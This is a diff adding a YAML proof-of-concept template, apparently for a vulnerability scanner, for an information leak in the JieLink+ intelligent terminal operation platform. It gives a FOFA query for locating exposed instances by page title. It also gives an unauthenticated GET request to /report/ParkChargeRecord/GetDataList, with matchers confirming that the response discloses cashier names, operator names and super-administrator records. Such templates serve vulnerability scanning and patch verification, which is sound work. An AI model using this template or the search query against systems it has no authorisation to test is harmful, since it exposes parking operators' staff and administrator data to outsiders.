@@ -1,0 +1,16 @@
+id: poc-yaml-jielink-plus-parkchargerecord-info-leak
+info:
+  name: JieLink+智能终端操作平台 ParkChargeRecord 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: JeLink+
+  fofa: title="JieLink+智能终端操作平台"
+requests:
+- method: GET
+  path: /report/ParkChargeRecord/GetDataList
+  expression: "status_code == 200 && \ncontains(body,\"\\\"CashierName\\\"\") &&\n\
+    contains(body,\"\\\"OperatorName\\\"\") &&\ncontains(body,\"\\\"超级管理员\\\"\") &&\n\
+    !contains(body,\"<\")\n"
+variables: {}
+transport: http
